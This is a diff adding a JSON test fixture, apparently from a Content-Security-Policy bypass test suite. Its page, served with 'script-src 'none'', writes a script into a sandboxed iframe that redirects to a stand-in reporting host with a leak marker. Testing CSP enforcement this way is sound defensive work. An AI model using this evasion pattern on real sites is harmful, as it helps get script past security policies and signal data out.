@@ -1,0 +1,13 @@
+```json
+{
+  "f886164": {
+    "url_queue.txt": "https://leak.test/CSP/f886164/main\nhttps://a.test/report/?leak=baseline\n",
+    "leak.test": {
+      "main": {
+        "index.html": "<iframe id=\"sandboxed\" sandbox=\"allow-scripts\"></iframe>\n<script>\n  const iframeDoc = document.getElementById('sandboxed').contentDocument;\n  iframeDoc.open();\n  iframeDoc.write('<script>document.location.href=\"https://a.test/report/?leak=f886164\"</script>');\n  iframeDoc.close();\n</script>",
+        "headers.json": "[\n  {\n    \"key\": \"Content-Security-Policy\",\n    \"value\": \"default-src 'self'; script-src 'none'\"\n  }\n]"
+      }
+    }
+  }
+}
+```
